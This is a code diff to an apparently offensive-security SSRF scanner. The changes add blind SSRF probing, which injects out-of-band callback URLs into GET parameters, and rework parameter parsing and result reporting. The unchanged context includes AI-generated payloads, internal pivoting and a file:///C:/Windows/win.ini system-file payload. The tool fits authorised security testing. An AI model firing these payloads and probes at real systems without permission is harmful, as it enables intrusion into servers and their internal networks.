@@ -19,6 +19,10 @@ import ollama
 import openai
 import anthropic
 import time
+from blind_verifier import InteractshVerifier
+import hashlib
+from oobe import OOBEHandler
+
 
 banner="""
  ### #### ####        ### #   # ###   #### # # 
@@ -47,8 +51,12 @@ args = parser.parse_args()
 # --- LLM CLIENT SETUP (Global) ---
 llm_client = None
 API_KEY = args.api_key or os.environ.get('API_KEY')
-VULNERABLE_URLS = []
+vulnerable_list = []
 print_lock = Lock()
+
+# Initialize global instance for Blind SSRF testing
+oobe = OOBEHandler(vulnerable_list, print_lock)
+oobe.setup()
 
 # If LLM fails to generate payload or not provided, we use these.
 CACHED_PAYLOADS = [
@@ -69,6 +77,7 @@ CACHED_PAYLOADS = [
 "file:///C:/Windows/win.ini"
 	]
 
+#Validating inputs and setting up LLM config
 if args.provider:
     print(f"\033[94m[*] Configuring AI Provider: {args.provider} ({args.model})\033[0m")
     
@@ -172,8 +181,7 @@ def pause_for_confirmation(attack_url, reason):
     """
     with print_lock:
         try:
-            print(f"\033[91m[!!!] CONFIRMED HIT: {attack_url}\033[0m")
-            print(f"\033[93m      Reason: {reason}\033[0m")
+            print(f"\033[91m[!!!] CONFIRMED HIT REFLECTED SSRF: {attack_url}\033[0m")
             input(f"\033[93mPress [ENTER] to continue hunting other parameters...\033[0m")
         except KeyboardInterrupt:
     	    print("\nExiting...")
@@ -313,9 +321,10 @@ def smart_pivot_to_internal(paramName, original_url):
             
             if result and result.get("status") == "VULNERABLE":
 				
-                VULNERABLE_URLS.append({
+                vulnerable_list.append({
                     "type": "Internal SSRF (AI Verified)",
-                    "url": attack_url,
+					"original_url":original_url,
+                    "vulnerable_param": paramName,
                     "payload": payload,
                     "reason": result.get('reason')
                 })
@@ -326,18 +335,40 @@ def smart_pivot_to_internal(paramName, original_url):
             # print(f"    Failed: {e}")
             pass
 
+# --- Inside your testing function ---
+def check_blind_ssrf(paramName, original_url):
+    if not oobe.enabled:
+        return
+
+    # Generate the Webhook.site URL with a unique ID
+    oob_payload = oobe.get_payload(original_url, paramName)
+    
+    # Surgical replacement logic
+    regex = f"({re.escape(paramName)}=)[^&?]+"
+    if not re.search(regex, original_url):
+        return False
+    attack_url = re.sub(regex, r"\1" + oob_payload, original_url)
+
+    try:
+        # Fire and forget
+        requests.get(attack_url, verify=False, timeout=5)
+    except:
+        pass
+
+
 # A safe, predictable external URL to test fetching
 CANARY_URL = "http://example.com"
 CANARY_SIGNATURE = "Example Domain"
 
-#Make an external request first, so lets its less noisy to find out if redirection is happening.
+#Make an external request first to example.com, so its less noisy to find out if redirection is happening
+#and then we check for SSRF.
 def check_non_blind_ssrf(paramName, original_url):
 	"""
 	1. Injects a known external URL (example.com).
 	2. Checks if the target server returns the content of that URL.
 	3. If yes, confirms Non-Blind SSRF.
 	"""
-	
+
 	# 1. Construct the Payload
 	# We use the regex logic you already had to replace the parameter value
 	regexToReplace = paramName + "=(.*?)(?:&|$)"
@@ -351,7 +382,8 @@ def check_non_blind_ssrf(paramName, original_url):
 	# Inject the Canary URL
 	attack_url = re.sub(parameterValuetoReplace, CANARY_URL, original_url)
 	
-	print(f"\033[94m[*] Probing for Non-Blind SSRF on '{paramName}' with canary: {CANARY_URL}\033[0m")
+	if args.verbose:
+		print(f"\033[94m[*] Probing for Non-Blind SSRF on '{paramName}' with canary: {CANARY_URL}\033[0m")
 	
 	try:
 		# 2. Fire the Request
@@ -369,12 +401,15 @@ def check_non_blind_ssrf(paramName, original_url):
 			return True
 			
 		else:
-			print(f"[-] Failed. Server did not return canary content.")
+			if args.verbose:
+				print(f"[-] Failed. Server did not return canary content.")
 			return False
 
 	except Exception as e:
 		print(f"[!] Error probing {paramName}: {e}")
 		return False
+
+
 
 #Keeps a record of links which are already saved and are present just once in the queue
 linksVisited=set()
@@ -407,9 +442,11 @@ def matchURLKeywordsInName(getOrForm,paramName,url):
 				print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm,"Name",paramName,url))
         				
 		ssrfVul.add(temp)
+		
 		#Trying to make an external request to validate potential SSRF (Only for GET parameter for now) 	
 		if getOrForm == "GET":
 			check_non_blind_ssrf(paramName,url)
+			check_blind_ssrf(paramName,url)
 
 #This checks URL pattern in param VALUE and also if an IP is passed somewhere in the values
 def matchURLPatternInValue(getOrForm, paramName,paramValues,url):
@@ -425,19 +462,35 @@ def matchURLPatternInValue(getOrForm, paramName,paramValues,url):
 		ssrfVul.add(temp)
 		if getOrForm == "GET":
 			check_non_blind_ssrf(paramName,url)
+			check_blind_ssrf(paramName,url)
+			
 
 
 def checkForGetRequest(url):
-	#print ("Checking for ssrf:"+url)
-	#Regex to find parameters in a url
-	checking_params_for_url= re.findall(r"(\?|\&)([^=]+)\=([^&]+)",url)
+	# Parse query parameters robustly using urllib.parse
+	# Handle non-standard separators (e.g. pilcrow ¶) and HTML entities
+	parsed = urlparse(url)
+	query = parsed.query
+	if not query:
+		return
 
-	#Checking if there is a parameter in the URL (This would filter rest APIs in the format /test/1 /test/2)
-	if not len(checking_params_for_url)==0:
-		#Getting the param values params[2] and param name params[1] and matching against regex
-		for params in checking_params_for_url:
-			matchURLKeywordsInName("GET",params[1],url)
-			matchURLPatternInValue("GET",params[1],params[2],url)
+	# Normalize some common bad separators that appear in exported URLs
+	query = query.replace('\u00B6', '&')
+	query = query.replace('¶', '&')
+	query = query.replace('&amp;', '&')
+
+	# Use parse_qsl to get ordered (name, value) pairs
+	try:
+		params_list = urllib.parse.parse_qsl(query, keep_blank_values=True)
+	except Exception:
+		# Fallback to previous regex-based extraction if parsing fails
+		checking_params_for_url = re.findall(r"(\?|\&)([^=]+)\=([^&]+)", url)
+		params_list = [(p[1], p[2]) for p in checking_params_for_url]
+
+	if not len(params_list) == 0:
+		for name, value in params_list:
+			matchURLKeywordsInName("GET", name, url)
+			matchURLPatternInValue("GET", name, value, url)
 			
 
 def checkFormParameters(siteContent,url):
@@ -460,6 +513,7 @@ def burp_matchURLKeywordsInName(getOrForm,paramName,url):
 		#Trying to make an external request to validate potential SSRF (Only for GET parameter for now)
 		if getOrForm == "GET":
 			check_non_blind_ssrf(paramName,url)
+			check_blind_ssrf(paramName,url)
 
 #This checks URL pattern in param VALUE and also if an IP is passed somewhere in the values
 def burp_matchURLPatternInValue(getOrForm, paramName,paramValues,url):
@@ -781,21 +835,36 @@ for i in range(num_threads):
 	worker.setDaemon = True
 	worker.start()
 
-q.join()
+# Run the main queue join and handle KeyboardInterrupt for graceful shutdown
+try:
+	q.join()
+	
+	if oobe.enabled:
+		wait_time = 30
+		print(f"[*] Waiting {wait_time}s for OOB callbacks...")
+		time.sleep(wait_time)
+		oobe.stop()
+		# This triggers the remote deletion
+		oobe.cleanup()
 
+	print("\n" + "="*70)
+	print(f" SCAN COMPLETED ")
+	print("="*70)
 
-print("\n" + "="*70)
-print(f" SCAN COMPLETED ")
-print("="*70)
-
-if len(VULNERABLE_URLS) > 0:
-    print(f"\033[91m[!] FOUND {len(VULNERABLE_URLS)} CONFIRMED VULNERABILITIES:\033[0m\n")
-    for idx, vuln in enumerate(VULNERABLE_URLS, 1):
-        print(f"  {idx}. [{vuln['type']}]")
-        print(f"     Attack URL: {vuln['url']}")
-        print(f"     Payload:    {vuln['payload']}")
-        print(f"     Reason:     {vuln['reason']}")
-        print("-" * 50)
-else:
-    print("\033[92m[+] No confirmed SSRF vulnerabilities found.\033[0m")
-print("="*70 + "\n")
+	if len(vulnerable_list) > 0:
+		print(f"\033[91m[!] FOUND {len(vulnerable_list)} CONFIRMED VULNERABILITIES:\033[0m\n")
+		for idx, vuln in enumerate(vulnerable_list, 1):
+			print(f"  {idx}. [{vuln['type']}]")
+			print(f"     Original URL: {vuln['original_url']}")
+			print(f"     Vulnerable param: {vuln['vulnerable_param']}")
+			print(f"     Payload:    {vuln['payload']}")
+			print(f"     Reason:     {vuln['reason']}")
+			print("-" * 50)
+	else:
+		print("\033[92m[+] No confirmed SSRF vulnerabilities found.\033[0m")
+	print("="*70 + "\n")
+except KeyboardInterrupt:
+			print("\n[!] Keyboard interrupt. Cleaning up...")
+			oobe.stop()
+			oobe.cleanup()
+			sys.exit(0)
